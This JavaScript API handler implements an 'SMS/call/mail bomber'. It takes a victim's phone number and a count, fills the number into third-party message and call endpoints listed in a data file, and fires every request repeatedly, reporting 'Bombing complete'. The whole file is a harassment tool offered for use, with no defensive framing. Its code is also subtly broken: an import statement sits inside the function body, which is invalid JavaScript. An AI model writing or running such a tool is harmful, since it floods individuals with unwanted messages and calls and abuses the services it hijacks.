import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { phone, countryCode, type, count } = req.body;

  if (!phone || !countryCode || !type || !count)
    return res.status(400).json({ error: 'Missing fields' });

  const jsonPath = path.join(process.cwd(), 'data', 'api.json');
  const jsonData = JSON.parse(fs.readFileSync(jsonPath, 'utf-8'));

  let apis = [];

  if (type === 'sms' || type === 'all') {
    if (jsonData.sms[countryCode]) apis.push(...jsonData.sms[countryCode]);
  }

  if (type === 'call' || type === 'all') {
    if (jsonData.call[countryCode]) apis.push(...jsonData.call[countryCode]);
  }

  if (type === 'mail' || type === 'all') {
    if (jsonData.mail.multi) apis.push(...jsonData.mail.multi);
  }

  import fetch from 'node-fetch';
  const results = [];

  for (let i = 0; i < count; i++) {
    for (let api of apis) {
      try {
        const url = api.url.replace('{target}', phone).replace('{cc}', countryCode);
        const response = await fetch(url, { method: api.method || 'GET' });
        const text = await response.text();
        const success = api.identifier && text.includes(api.identifier);
        results.push({ name: api.name, url, status: success ? '✅' : '❌' });
      } catch (err) {
        results.push({ name: api.name, url: api.url, status: '❌ error' });
      }
    }
  }

  res.status(200).json({ message: 'Bombing complete', results });
}
